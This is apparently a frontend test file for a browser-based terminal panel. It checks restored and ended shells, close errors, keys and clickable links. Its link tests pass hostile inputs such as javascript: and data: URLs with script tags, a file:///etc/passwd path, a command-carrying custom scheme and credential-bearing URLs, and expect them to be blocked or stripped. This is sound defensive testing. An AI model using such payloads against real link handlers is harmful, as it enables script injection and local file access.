    await provider.writeText('c', 'hidden')
    expect(write).not.toHaveBeenCalled() // output alone is no gesture

    screenInput.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true }))
    await provider.writeText('c', 'copied')
    expect(write).toHaveBeenCalledWith('copied')

    screenInput.blur()
    write.mockClear()
    await provider.writeText('c', 'unfocused')
    expect(write).not.toHaveBeenCalled()
  })
})

describe('a terminal found again after a reload', () => {
  function RunIt({ command }: { command: string }) {
    const group = useTerminalGroup('ws_1')
    return <button onClick={() => group.run(command)}>run it</button>
  }

  it('runs a chosen command once its screen is shown, with the drawer shut until then', async () => {
    rememberTerminals(['term_9'])
    const user = userEvent.setup()
    const view = render(<RunIt command="ls" />)
    await waitFor(() => expect(streams).toBe(1))
    await waitFor(() => expect(xterm.terms).toHaveLength(1))
    await user.click(screen.getByRole('button', { name: 'run it' }))
    expect(agentOpsApi.terminalInput).not.toHaveBeenCalled()
    view.rerender(
      <>
        <RunIt command="ls" />
        <SessionTerminal workspaceRef="ws_1" />
      </>,
    )
    await waitFor(() =>
      expect(
        vi
          .mocked(agentOpsApi.terminalInput)
          .mock.calls.map((c) => c[2])
          .join(''),
      ).toBe('\x15ls\r'),
    )
  })

  it('does not answer the device queries of the history it restores, and answers live ones', async () => {
    rememberTerminals(['term_9'])
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() => expect(streams).toBe(1))
    const history = 'old\x1b[c'
    act(() => {
      push(`event: replay\ndata: {"end":${history.length}}\n\n`)
      push(frame(0, history))
    })
    await waitFor(() => expect(xterm.terms[0].written).toEqual([history]))
    await act(async () => {
      await Promise.resolve()
    })
    expect(agentOpsApi.terminalInput).not.toHaveBeenCalled()
    act(() => push(frame(history.length, '\x1b[c')))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_9',
        '\x1b[?1;2c',
      ),
    )
  })
})

describe('a terminal started just now', () => {
  it('answers what its shell asks before the stream opened', async () => {
    await openIt()
    act(() => {
      push('event: replay\ndata: {"end":3}\n\n')
      push(frame(0, '\x1b[c'))
    })
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        '\x1b[?1;2c',
      ),
    )
  })
})

describe('a terminal whose shell ended with a server restart', () => {
  // The server gives back what the shell printed, then says the restart ended it.
  const restarted = (history: string) => {
    push(`event: replay\ndata: {"end":${history.length}}\n\n`)
    push(frame(0, history))
    push('event: exit\ndata: {"code":-1,"reason":"the server restarted"}\n\n')
  }
  const findAgain = async () => {
    rememberTerminals(['term_9'])
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() => expect(streams).toBe(1))
    act(() => restarted('npm test\r\n'))
    return user
  }

  it('shows its history, says politely that the restart ended its shell, and takes no keys', async () => {
    await findAgain()
    expect(
      await screen.findByText(
        'The server restarted, so this shell ended. Its history is above.',
      ),
    ).toHaveAttribute('role', 'status')
    expect(xterm.terms[0].written).toEqual(['npm test\r\n'])
    // Nothing pretends the shell is alive: no key, size or reconnect reaches the server.
    act(() => xterm.terms[0].data.forEach((cb) => cb('ls\r')))
    act(() =>
      xterm.terms[0].resized.forEach((cb) => cb({ rows: 12, cols: 40 })),
    )
    await act(() => new Promise((r) => setTimeout(r, 600)))
    expect(agentOpsApi.terminalInput).not.toHaveBeenCalled()
    expect(agentOpsApi.terminalSize).not.toHaveBeenCalled()
    expect(streams).toBe(1)
  })

  it('is marked ended in the list by a word, with one next step: a new terminal here', async () => {
    const user = await findAgain()
    expect(
      await screen.findByRole('tab', { name: 'Terminal 1 Ended' }),
    ).toBeInTheDocument()
    await user.click(screen.getByRole('button', { name: 'New terminal here' }))
    await waitFor(() =>
      expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(1),
    )
    expect(vi.mocked(agentOpsApi.startTerminal).mock.calls[0]?.[0]).toBe('ws_1')
    expect(screen.getAllByRole('tab')).toHaveLength(2)
  })

  it('says in its Close that its history goes too, and a live one keeps the plain words', async () => {
    const user = await findAgain()
    const close = await screen.findByRole('button', {
      name: 'Close Terminal 1 and its history',
    })
    expect(close).toHaveAttribute('title', 'Close Terminal 1 and its history')
    await user.click(screen.getByRole('button', { name: 'New terminal here' }))
    expect(
      await screen.findByRole('button', { name: 'Close Terminal 2' }),
    ).toHaveAttribute('title', 'Close Terminal 2')
  })

  it('closes without asking, and the server forgets its history', async () => {
    const user = await findAgain()
    await screen.findByText(/The server restarted/)
    await user.click(
      screen.getByRole('button', { name: 'Close Terminal 1 and its history' }),
    )
    // Its shell is gone: there is nothing to confirm.
    expect(screen.queryByRole('button', { name: 'Close terminal' })).toBeNull()
    await waitFor(() =>
      expect(agentOpsApi.closeTerminal).toHaveBeenCalledWith('ws_1', 'term_9'),
    )
    expect(
      await screen.findByRole('button', { name: 'Open terminal' }),
    ).toBeInTheDocument()
  })

  it('stays, and says the server still keeps its history, when that close fails', async () => {
    const user = await findAgain()
    vi.mocked(agentOpsApi.closeTerminal).mockRejectedValueOnce(
      new ApiError(500, 'internal', 'down'),
    )
    await screen.findByText(/The server restarted/)
    await user.click(
      screen.getByRole('button', { name: 'Close Terminal 1 and its history' }),
    )
    expect((await screen.findByRole('alert')).textContent).toBe(
      'The terminal could not be closed; the server still keeps its history. Try again in a moment.',
    )
    expect(screen.getAllByRole('tab')).toHaveLength(1)
  })

  it('keeps it when a key reaches the ended shell first, says so, and lets the exit frame end it', async () => {
    rememberTerminals(['term_9'])
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() => expect(streams).toBe(1))
    // Before the history and the exit frame arrive, the screen still takes keys.
    vi.mocked(agentOpsApi.terminalInput).mockRejectedValueOnce(
      new ApiError(410, 'gone', 'the terminal has ended'),
    )
    act(() => xterm.terms[0].data.forEach((cb) => cb('ls\r')))
    expect((await screen.findByRole('alert')).textContent).toBe(
      'Not sent: this shell had already ended.',
    )
    // The stream, not the refused key, says what ended the shell.
    act(() => restarted('npm test\r\n'))
    expect(
      await screen.findByText(
        'The server restarted, so this shell ended. Its history is above.',
      ),
    ).toBeInTheDocument()
    // Its id stayed, so closing it has the server forget its history, once.
    await user.click(screen.getByRole('button', { name: /^Close Terminal 1/ }))
    await waitFor(() =>
      expect(agentOpsApi.closeTerminal).toHaveBeenCalledWith('ws_1', 'term_9'),
    )
    expect(agentOpsApi.closeTerminal).toHaveBeenCalledTimes(1)
  })
})

describe('closing a terminal', () => {
  it('keeps the terminal and says so when the server did not end the shell', async () => {
    const user = await openIt()
    vi.mocked(agentOpsApi.closeTerminal).mockRejectedValueOnce(
      new ApiError(500, 'internal', 'down'),
    )
    await user.click(screen.getByRole('button', { name: 'Close Terminal 1' }))
    await user.click(screen.getByRole('button', { name: 'Close terminal' }))
    expect((await screen.findByRole('alert')).textContent).toMatch(
      /could not be closed/,
    )
    expect(screen.getAllByRole('tab')).toHaveLength(1)
    expect(xterm.terms[0].disposed).toBe(false)
  })
})

describe('the keys of a terminal', () => {
  const key = (init: KeyboardEventInit) =>
    new KeyboardEvent('keydown', { bubbles: true, ...init })

  it('takes its own keys without typing them, and leaves the shell its Ctrl+A', async () => {
    await openIt()
    const term = xterm.terms[0]!
    const typed = term.keys[0]!
    expect(typed(key({ key: 'a', code: 'KeyA', ctrlKey: true }))).toBe(true)
    expect(term.allSelected).toBe(false)
    expect(
      typed(key({ key: 'A', code: 'KeyA', ctrlKey: true, shiftKey: true })),
    ).toBe(false)
    expect(term.allSelected).toBe(true)
    expect(
      typed(key({ key: 'Home', code: 'Home', ctrlKey: true, shiftKey: true })),
    ).toBe(false)
    expect(term.scrolled).toBe('top')
    expect(
      typed(key({ key: 'End', code: 'End', ctrlKey: true, shiftKey: true })),
    ).toBe(false)
    expect(term.scrolled).toBe('bottom')
    // A key of the drawer acts in the drawer.
    const newTerminal = key({
      key: 'N',
      code: 'KeyN',
      altKey: true,
      shiftKey: true,
    })
    expect(typed(newTerminal)).toBe(false)
    act(() => void term.textarea.dispatchEvent(newTerminal))
    await waitFor(() => expect(screen.getAllByRole('tab')).toHaveLength(2))
  })
})

describe('the links of a terminal', () => {
  // The handler the store gives a screen for a hyperlink a program names (OSC 8).
  interface Door {
    activate: (event: MouseEvent, uri: string) => void
    hover?: (event: MouseEvent, uri: string) => void
    leave?: (event: MouseEvent, uri: string) => void
  }
  const doorOf = () => xterm.terms[0]!.options.linkHandler as Door | undefined

  it('finds URLs and paths with a line, and leaves words and versions alone', () => {
    useClientSettings.setState({ editor: 'vscode', editorSsh: '' })
    const found = linksIn(
      'see https://example.com/a, then src/app.ts:3 not make v1.2.3',
      '/work/repo',
    )
    expect(found.map((l) => l.text)).toEqual([
      'https://example.com/a',
      'src/app.ts:3',
    ])
    expect(found[0]?.external).toBe(true)
    expect(found[1]?.href).toContain('/work/repo/src/app.ts')
    expect(found[1]?.href).toContain(':3')
  })

  it('makes a link only of an http or https address a browser can open', () => {
    const found = linksIn('see https://[oops then https://example.com/a', null)
    expect(found.map((l) => l.href)).toEqual(['https://example.com/a'])
  })

  it('opens a clicked address in a new tab only when it is http or https', async () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null)
    await openIt()
    const click = xterm.webLinks[0]!
    const event = new MouseEvent('click')
    click(event, 'https://[oops')
    click(event, 'ftp://example.com/a')
    expect(open).not.toHaveBeenCalled()
    click(event, 'https://example.com/a')
    expect(open).toHaveBeenCalledWith(
      'https://example.com/a',
      '_blank',
      'noopener,noreferrer',
    )
  })

  it('opens a hyperlink a program names (OSC 8) only when it is http or https, with no prompt', async () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null)
    const confirm = vi.spyOn(window, 'confirm').mockReturnValue(true)
    const page = window.location.href
    await openIt()
    // The handler the store gives the screen for such a link: the output names the
    // address, so it goes through the same door as a printed one.
    const door = doorOf()
    expect(door?.activate).toBeTypeOf('function')
    const event = new MouseEvent('click')
    for (const uri of [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'file:///etc/passwd',
      'olivares-x://run?cmd=whoami',
    ])
      door!.activate(event, uri)
    expect(open).not.toHaveBeenCalled()
    expect(window.location.href).toBe(page)
    door!.activate(event, 'https://example.com/a')
    door!.activate(event, 'http://example.com/b')
    expect(open.mock.calls).toEqual([
      ['https://example.com/a', '_blank', 'noopener,noreferrer'],
      ['http://example.com/b', '_blank', 'noopener,noreferrer'],
    ])
    expect(confirm).not.toHaveBeenCalled()
  })

  it('opens the address a browser reads, not the text it was written as', async () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null)
    await openIt()
    const event = new MouseEvent('click')
    // A printed address (the web links addon) and one a program names (OSC 8).
    for (const click of [xterm.webLinks[0]!, doorOf()!.activate]) {
      open.mockClear()
      click(event, 'JAVASCRIPT:alert(1)')
      expect(open).not.toHaveBeenCalled()
      // Opened as written, this would be a path of the console's own page.
      click(event, 'https:example.com/a')
      click(event, '  https://example.com/b')
      expect(open.mock.calls).toEqual([
        ['https://example.com/a', '_blank', 'noopener,noreferrer'],
        ['https://example.com/b', '_blank', 'noopener,noreferrer'],
      ])
    }
    const [printed] = linksIn('see HTTPS://Example.com/c', null)
    expect(printed?.text).toBe('HTTPS://Example.com/c')
    expect(printed?.href).toBe('https://example.com/c')
  })

  it('shows the address a hyperlink (OSC 8) opens while the pointer is on it', async () => {
    await openIt()
    const door = doorOf()!
    const event = new MouseEvent('mouseover')
    const screenOf = screen.getByTestId('terminal-screen')
    expect(door.hover).toBeTypeOf('function')
    door.hover!(event, 'https:example.com/docs')
    expect(screenOf).toContainElement(
      screen.getByTitle('example.com · https://example.com/docs'),
    )
    door.leave!(event, 'https:example.com/docs')
    expect(screen.queryByTitle(/example\.com/)).toBeNull()
    // An address that would not open is not named either.
    door.hover!(event, 'javascript:alert(1)')
    expect(screen.queryByTitle(/javascript/i)).toBeNull()
  })

  it('names the host first, and no user name or password, on a hyperlink (OSC 8)', async () => {
    await openIt()
    const door = doorOf()!
    const event = new MouseEvent('mouseover')
    // The words before "@" read as a host, and are not the host the link opens.
    door.hover!(event, 'https://docs.example.com@example.net/login')
    expect(
      screen.getByTitle('example.net · https://example.net/login'),
    ).toBeInTheDocument()
    door.leave!(event, 'https://docs.example.com@example.net/login')
    door.hover!(event, 'https://ana:s3cret@example.com:8443/x')
    expect(
      screen.getByTitle('example.com:8443 · https://example.com:8443/x'),
    ).toBeInTheDocument()
    expect(screen.queryByTitle(/s3cret/)).toBeNull()
  })

  it('opens an address without the user name and password it carries, the one the pointer names', async () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null)
    await openIt()
    const event = new MouseEvent('click')
    // A printed address (the web links addon) and one a program names (OSC 8).
    for (const click of [xterm.webLinks[0]!, doorOf()!.activate]) {
      open.mockClear()
      click(event, 'https://ana:s3cret@example.com:8443/x')
      click(event, 'https://docs.example.com@example.net/login')
      expect(open.mock.calls).toEqual([
        ['https://example.com:8443/x', '_blank', 'noopener,noreferrer'],
        ['https://example.net/login', '_blank', 'noopener,noreferrer'],
      ])
    }
  })

  it('lists a printed address for the keyboard and opens it without its user name and password', async () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null)
    const user = await openIt()
    const term = xterm.terms[0]!
    term.lines = ['see https://ana:s3cret@example.com/x']
    expect(linksIn(term.lines[0]!, null).map((l) => l.href)).toEqual([
      'https://example.com/x',
    ])
    const key = new KeyboardEvent('keydown', {
      key: 'L',
      code: 'KeyL',
      altKey: true,
      shiftKey: true,
      bubbles: true,
    })
    act(() => void term.textarea.dispatchEvent(key))
    await user.click(
      await screen.findByRole('option', { name: /example\.com/ }),
    )
    expect(open.mock.calls).toEqual([
      ['https://example.com/x', '_blank', 'noopener,noreferrer'],
    ])
  })

  it('names no address once the screen is put away with the pointer on a hyperlink', async () => {
    const user = userEvent.setup()
    const first = render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    doorOf()!.hover!(new MouseEvent('mouseover'), 'https://example.com/docs')
    expect(screen.getByTitle(/example\.com\/docs/)).toBeInTheDocument()
    // Another session is shown with the pointer still on the link: no leave comes.
    first.unmount()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() =>
      expect(screen.getByTestId('terminal-screen')).toContainElement(
        xterm.terms[0]!.textarea,
      ),
    )
    expect(screen.queryByTitle(/example\.com/)).toBeNull()
  })

  it('makes a path clickable and lists what is on screen for the keyboard', async () => {
    useClientSettings.setState({ editor: 'vscode', editorSsh: '' })
    const open = vi.spyOn(window, 'open').mockReturnValue(null)
    const user = userEvent.setup()
    function Rooted() {
      useTerminalGroup('ws_1', '/work/repo')
      return <SessionTerminal workspaceRef="ws_1" />
    }
    render(<Rooted />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    const term = xterm.terms[0]!
    term.lines = ['failed at src/app.ts:3 see https://example.com']

    let row: { text: string }[] | undefined
    term.linkProviders[0]!.provideLinks(1, (l) => (row = l))
    expect(row?.map((l) => l.text)).toEqual(['src/app.ts:3'])

    const key = new KeyboardEvent('keydown', {
      key: 'L',
      code: 'KeyL',
      altKey: true,
      shiftKey: true,
      bubbles: true,
    })
    expect(term.keys[0]!(key)).toBe(false) // not typed into the shell
    act(() => void term.textarea.dispatchEvent(key))
    await user.click(
      await screen.findByRole('option', { name: /example\.com/ }),
    )
    // The address as a browser reads it.
    expect(open).toHaveBeenCalledWith(
      'https://example.com/',
      '_blank',
      'noopener,noreferrer',
    )
  })
})

describe('the look of a terminal', () => {
  const root = document.documentElement.style
  // The host's place (the folder's name) and its own control at the end.
  function Hosted() {
    const group = useTerminalGroup('ws_1')
    return (
      <TerminalPanel
        group={group}
        place={<span>portal</span>}
        trail={<button type="button">Hide</button>}
      />
    )
  }
  afterEach(() => {
    root.removeProperty('--well')
    root.removeProperty('--frame')
  })

  it('paints its screen the color of the well it sits in', async () => {
    root.setProperty('--frame', 'rgb(1, 1, 1)')
    root.setProperty('--well', 'rgb(2, 2, 2)')
    await openIt()
    expect(xterm.terms[0]!.options.theme).toMatchObject({
      background: 'rgb(2, 2, 2)',
    })
  })

  it('takes the frame where the console has no well color yet', async () => {
    root.setProperty('--frame', 'rgb(1, 1, 1)')
    await openIt()
    expect(xterm.terms[0]!.options.theme).toMatchObject({
      background: 'rgb(1, 1, 1)',
    })
  })

  it('leads its title row with the tabs, then the folder and shell, quiet, then the controls', async () => {
    vi.mocked(agentOpsApi.startTerminal).mockResolvedValueOnce({
      terminal: 'term_1',
      confinement: 'landlock',
      idle_seconds: 0,
      reconnect_seconds: 0,
      shell: 'bash',
    })
    const user = userEvent.setup()
    render(<Hosted />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await screen.findByText('bash')
    const inOrder = [
      screen.getByRole('tablist', { name: 'Terminals' }),
      screen.getByRole('button', { name: 'New terminal' }),
      screen.getByText('portal'),
      screen.getByText('bash'),
      screen.getByRole('button', { name: 'Split' }),
      screen.getByRole('button', { name: 'Close Terminal 1' }),
      screen.getByRole('button', { name: 'Hide' }),
    ]
    // The order in the page is the order on screen and on the keyboard.
    const all = [...document.body.querySelectorAll('*')]
    const at = inOrder.map((el) => all.indexOf(el))
    expect(at).toEqual([...at].sort((a, b) => a - b))
  })

  it('names its place and controls on a pane before its first terminal, as after it', () => {
    render(<Hosted />)
    const bar = screen.getByRole('button', { name: 'Hide' }).parentElement!
    expect(bar).toContainElement(screen.getByText('portal'))
    expect(bar.className).toMatch(/bg-\[var\(--pane/)
    expect(bar.className).toMatch(/\bborder-b\b/)
    // Its one action stays, under the bar.
    expect(bar).not.toContainElement(
      screen.getByRole('button', { name: 'Open terminal' }),
    )
  })
})
